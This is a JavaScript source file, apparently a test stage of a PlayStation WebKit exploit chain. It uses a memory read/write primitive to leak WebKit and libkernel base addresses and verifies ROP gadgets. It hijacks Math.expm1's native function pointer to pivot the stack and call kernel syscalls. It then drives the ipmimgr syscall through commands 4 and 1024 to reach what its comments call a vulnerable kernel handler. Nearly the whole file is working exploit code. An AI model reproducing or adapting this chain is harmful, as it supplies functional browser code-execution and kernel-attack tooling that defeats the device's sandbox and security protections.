// IPMI test — isolated from chain_poops
// Tests: syscall 622 (ipmimgr) accessibility + command 4/1024 flow

import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];
let passCount = 0, failCount = 0;
const params = new URLSearchParams(location.search);
const VERBOSE = params.get("verbose") === "1";

function mark(tag, detail) {
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    lines.push(line);
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(function (l) {
        const c = /FAIL|ERROR|THREW|PANIC|UAF|CRASH/i.test(l) ? "bad"
                : /WARN|SKIP|REFUSED/i.test(l) ? "warn"
                : /\bOK\b|PASS|ACCEPTED|FOUND/i.test(l) ? "ok" : "";
        const e = esc(l);
        return c ? '<span class="' + c + '">' + e + "</span>" : e;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
    console.log(line);
}
function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
function check(name, ok, detail) {
    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
    return ok;
}
function hx(n) { return "0x" + (n >>> 0).toString(16); }

// ══════════════════════════════════════════════════════════════════
//  Syscall table (solo las que necesitamos)
// ══════════════════════════════════════════════════════════════════
const SYS = {
    getpid: 20,
    getuid: 0x18,
    ipmimgr: 0x26e,
};

// ══════════════════════════════════════════════════════════════════
//  Constants
// ══════════════════════════════════════════════════════════════════
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const keepAlive = [];

// ══════════════════════════════════════════════════════════════════
//  Globals filled during setup
// ══════════════════════════════════════════════════════════════════
let p = null;
let off = null;
let webkitBase = null, libkernelBase = null, errorFn = null;
const G = {};
let M = null;
let mainMf = null, mainOrig = null, mainArmed = false;
let pivotCell = null, pivotObj = null;
let argGadget = null;
const stubAddr = new Map();

// ══════════════════════════════════════════════════════════════════
//  Helpers (copiados de chain_poops)
// ══════════════════════════════════════════════════════════════════
function bufAddr(ab) {
    const c = p.leakval(ab);
    return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
        .add32(off.wk_ArrayBuffer_m_contents_m_data));
}
function put(dv, at, v) {
    if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
    } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
    }
}

// ══════════════════════════════════════════════════════════════════
//  makeCtx / layout / callAddr  (sin argGadget POP_R10)
// ══════════════════════════════════════════════════════════════════
const PB_SIZE = () => Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);

function makeCtx() {
    const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE());
    const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
    keepAlive.push(sb, pb, kb, fb);
    const c = { storeDv: new DataView(sb), pivotDv: new DataView(pb),
                stackDv: new DataView(kb), frameDv: new DataView(fb),
                stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb) };
    keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv,
                   c.stackU8, c.frameU8);
    c.S = bufAddr(sb); c.P = bufAddr(pb);
    c.K = bufAddr(kb); c.F = bufAddr(fb);
    put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
    put(c.storeDv, 0x10, G.G3); put(c.storeDv, 0x18, G.G2);
    put(c.pivotDv, 0x00, c.P); put(c.pivotDv, 0x10, G.G5);
    put(c.pivotDv, 0x20, G.G4);
    return c;
}
function layout(c, target, args) {
    c.stackU8.fill(0); c.frameU8.fill(0);
    const insts = [];
    for (let i = 0; i < args.length; ++i) {
        insts.push(argGadget[i]); insts.push(args[i]);
    }
    const targetIdx = insts.length;
    insts.push(target);
    insts.push(G.POP_RDI_RET); insts.push(c.F);
    insts.push(G.MOV_RDI_RAX_RET);
    insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
    insts.push(G.LEAVE_RET);
    let at = 0x2000 - 8 * insts.length;
    if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
    for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
    put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
}
function callAddr(target, args) {
    layout(M, target, args);
    const saved = p.read8(pivotCell);
    p.write8(pivotCell, M.S);
    Math.expm1(pivotObj);
    p.write8(pivotCell, saved);
    return { lo: M.frameDv.getUint32(0, true),
             hi: M.frameDv.getUint32(4, true),
             i32: M.frameDv.getUint32(0, true) | 0 };
}
const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
function errno() {
    const r = callAddr(errorFn, []);
    const a = new int64(r.lo, r.hi);
    return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
}

// ══════════════════════════════════════════════════════════════════
//  Setup: find bases + gadgets + stubs
// ══════════════════════════════════════════════════════════════════
function setupGadgets() {
    const GAD = [
        ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
        ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
        ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
        ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
        ["POP_R8_RET",  off.wk_POP_R8_RET,  [null, 0x58, 0xc3]],
        ["POP_R9_RET",  off.wk_POP_R9_RET,  [null, 0x59, 0xc3]],
        ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
        ["LEAVE_RET",   off.wk_LEAVE_RET,   [0xc9, 0xc3]],
        ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
            [0x48, 0x89, 0x07, 0xc3]],
        ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
        ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
        ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
        ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
        ["G4", off.wk_MOV_RDX_RAX_18_CALL_10,
            [0x48, 0x8b, 0x50, off.pivot_view_sp]],
        ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
    ];
    let gated = 0;
    for (const [nm, rva, pat] of GAD) {
        const a = webkitBase.add32(rva);
        let good = true;
        for (let i = 0; i < pat.length; ++i) {
            if (pat[i] === null) continue;
            if (p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
        }
        if (good) { G[nm] = a; gated++; } else mark("GADGET-BAD", nm);
    }
    return gated === GAD.length ? gated + "/" + GAD.length : false;
}

function setupStubs() {
    // Scan the syscall page looking for `48 c7 c0 XX XX 00 00 49 89 ca ...`
    const need = new Set(Object.values(SYS));
    let scanned = 0;
    for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
        const v = p.read8(libkernelBase.add32(o));
        if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49)
            continue;
        const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
        if (!need.has(num)) continue;
        stubAddr.set(num, libkernelBase.add32(o));
        need.delete(num);
        scanned++;
    }
    // Also use pre-seeded stubs from offsets if any
    if (off.k_stubs) {
        for (const numStr in off.k_stubs) {
            const num = +numStr, o = off.k_stubs[numStr];
            if (stubAddr.has(num)) continue;
            if (!Object.values(SYS).includes(num)) continue;
            const v = p.read8(libkernelBase.add32(o));
            if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49)
                continue;
            if ((((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) !== num)
                continue;
            stubAddr.set(num, libkernelBase.add32(o));
            need.delete(num);
        }
    }
    return { scanned, missing: [...need] };
}

// ══════════════════════════════════════════════════════════════════
//  Main
// ══════════════════════════════════════════════════════════════════
(async function () {
    try {
        const o = offsetsFor(navigator.userAgent);
        off = o.off;
        if (!off) { state("no offsets for firmware", "bad"); return; }

        function prettyFW(ua) {
            const m = /PlayStation\s+([45])[\/ ](\d+)\.(\d+)/.exec(ua || "");
            if (!m) return "non-PS";
            return "PS" + m[1] + "-" + m[2] + "." + m[3];
        }
        mark("FW", prettyFW(navigator.userAgent));
        mark("FW-STATUS", off.fw_status || "none");

        state("establishing primitive...", "warn");
        const carrier = await establishPrimitive({
            maxAttempts: 6,
            onEvent: (t, d) => mark("PRIM-" + t, d || "")
        });

        installWindowP(carrier, {
            promote: true,
            onEvent: (t, d) => mark("PAIR-" + t, d || "")
        });
        if (!window.p) throw new Error("window.p not installed");
        p = window.p;
        mark("PRIMITIVE-OK", "pair=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);

        // Bases
        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function));
        webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        libkernelBase = errorFn.sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
        if (!check("module-bases-0x4000-aligned",
                   aligned(webkitBase) && aligned(libkernelBase), ""))
            return;

        // Gadgets
        const gres = setupGadgets();
        if (!check("gadget-table-fits-module", gres, gres || "")) return;
        argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                     G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

        // Stubs
        const sr = setupStubs();
        mark("STUBS", "scanned=" + sr.scanned
             + (sr.missing.length ? " missing=" + sr.missing.join(",") : ""));
        if (!check("syscall-page-needs-stub",
                   sr.missing.length === 0, sr.missing.join(",")))
            return;

        // Build call machinery
        M = makeCtx();
        mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
        mainOrig = p.read8(mainMf);
        pivotObj = {};
        keepAlive.push(pivotObj);
        pivotCell = p.leakval(pivotObj);
        p.write8(mainMf, G.G0);
        mainArmed = true;

        // Sanity: getpid
        const pid = sc(SYS.getpid).i32;
        check("chain-reaches-kernel", pid > 0, "pid=" + pid
              + " uid=" + sc(SYS.getuid).i32);

        // ═══════════════════════════════════════════════════════════
        //  IPMI TEST #1 — accesibilidad
        // ═══════════════════════════════════════════════════════════
        {
            const argsAb = new ArrayBuffer(0x30);
            const inAb   = new ArrayBuffer(0x40);
            const outAb  = new ArrayBuffer(0x10);
            keepAlive.push(argsAb, inAb, outAb);
            const argsAddr = bufAddr(argsAb);
            const inAddr   = bufAddr(inAb);
            const outAddr  = bufAddr(outAb);
            const argsDv   = new DataView(argsAb);
            new Uint8Array(inAb).fill(0);
            new Uint8Array(outAb).fill(0);

            argsDv.setUint32(0x00, 0, true);
            argsDv.setUint32(0x08, 0, true);
            put(argsDv, 0x10, outAddr);
            put(argsDv, 0x18, inAddr);
            put(argsDv, 0x20, 0x40);

            const ret = sc(SYS.ipmimgr, argsAddr).i32;
            const err = ret === -1 ? errno() : 0;
            mark("IPMI-TEST", "rv=" + ret + " errno=" + err);
            if (ret === -1) {
                if (err === 1)  state("EPERM — sandbox", "bad");
                if (err === 78) state("ENOSYS", "bad");
                if (err === 22) state("EINVAL", "warn");
                mark("IPMI-VERDICT", "rv=-1 errno=" + err);
            } else {
                mark("IPMI-VERDICT", "ACCESO OK");
            }
        }

        // ═══════════════════════════════════════════════════════════
        //  IPMI TEST #2 — command 4 (crear handle tipo 32772)
        //  seguido de command 1024 (disparar el handler vulnerable)
        // ═══════════════════════════════════════════════════════════
        {
            const nameAb = new ArrayBuffer(32);
            const nameU8 = new Uint8Array(nameAb);
            "SceSvch".split("").forEach((c, i) => nameU8[i] = c.charCodeAt(0));
            nameU8[7] = 0;
            const nameAddr = bufAddr(nameAb);
            keepAlive.push(nameAb);

            const paramsAb = new ArrayBuffer(0x38);
            const paramsDv = new DataView(paramsAb);
            paramsDv.setUint32(0x00, 0x30, true);
            paramsDv.setUint32(0x08, 0x1000, true);
            paramsDv.setUint32(0x10, 0x10000, true);
            paramsDv.setUint32(0x18, 0, true);
            paramsDv.setUint32(0x1C, 0, true);
            paramsDv.setUint32(0x20, 0, true);
            const paramsAddr = bufAddr(paramsAb);
            keepAlive.push(paramsAb);

            const timeoutAb = new ArrayBuffer(4);
            new DataView(timeoutAb).setUint32(0, 10000, true);
            const timeoutAddr = bufAddr(timeoutAb);
            keepAlive.push(timeoutAb);

            const in64Ab  = new ArrayBuffer(0x40);
            const out4Ab  = new ArrayBuffer(4);
            const argsAb  = new ArrayBuffer(0x30);
            keepAlive.push(in64Ab, out4Ab, argsAb);
            const in64Addr  = bufAddr(in64Ab);
            const out4Addr  = bufAddr(out4Ab);
            const argsAddr2 = bufAddr(argsAb);
            const in64Dv    = new DataView(in64Ab);
            const argsDv2   = new DataView(argsAb);

            // ── Command 4: crear handle ──
            new Uint8Array(in64Ab).fill(0);
            put(in64Dv, 0x08, nameAddr);
            put(in64Dv, 0x10, paramsAddr);

            argsDv2.setUint32(0x00, 4, true);
            argsDv2.setUint32(0x08, 0, true);
            put(argsDv2, 0x10, out4Addr);
            put(argsDv2, 0x18, in64Addr);
            put(argsDv2, 0x20, 0x40);

            const rc0 = sc(SYS.ipmimgr, argsAddr2).i32;
            const er0 = rc0 === -1 ? errno() : 0;
            const handle = new DataView(out4Ab).getUint32(0, true);
            mark("IPMI-CREATE-CMD4", "rv=" + rc0 + " errno=" + er0
                 + " handle=0x" + handle.toString(16));

            if (rc0 !== 0) {
                mark("IPMI-VERDICT", "cmd4 create falló");
            } else {
                // ── Command 1024 ──
                new Uint8Array(in64Ab).fill(0);
                put(in64Dv, 0x10, 0x1000);
                put(in64Dv, 0x18, timeoutAddr);

                argsDv2.setUint32(0x00, 1024, true);
                argsDv2.setUint32(0x08, handle, true);
                put(argsDv2, 0x10, out4Addr);
                put(argsDv2, 0x18, in64Addr);
                put(argsDv2, 0x20, 0x40);

                const rc1 = sc(SYS.ipmimgr, argsAddr2).i32;
                const er1 = rc1 === -1 ? errno() : 0;
                mark("IPMI-CMD-1024-REAL", "rv=" + rc1 + " errno=" + er1
                     + " out=0x"
                     + new DataView(out4Ab).getUint32(0, true).toString(16));

                if (rc1 !== -1) {
                    mark("IPMI-CMD-VERDICT",
                         "command 1024 OK — flujo alcanzado");
                } else {
                    if (er1 === 22) mark("IPMI-CMD-VERDICT", "EINVAL");
                    if (er1 === 2)  mark("IPMI-CMD-VERDICT",
                        "ENOENT — tipo de handle incorrecto");
                    if (er1 === 1)  mark("IPMI-CMD-VERDICT", "EPERM interno");
                    if (er1 === 0)  mark("IPMI-CMD-VERDICT", "rv=-1 errno=0");
                }
            }
        }

        mark("DONE", "pass=" + passCount + " fail=" + failCount);
        state("DONE — see log", passCount > 0 && failCount === 0 ? "ok" : "warn");

    } catch (e) {
        mark("IPMI-FAILED", (e && e.message) ? e.message : String(e));
        state("FAILED", "bad");
    } finally {
        // restore expm1 if armed
        try {
            if (mainArmed && mainMf && mainOrig && p) {
                p.write8(mainMf, mainOrig);
                mainArmed = false;
                mark("EXPM1-RESTORED",
                     "expm1(1)=" + Math.expm1(1));
            }
        } catch (e) { mark("RESTORE-THREW", e.message); }
    }
})();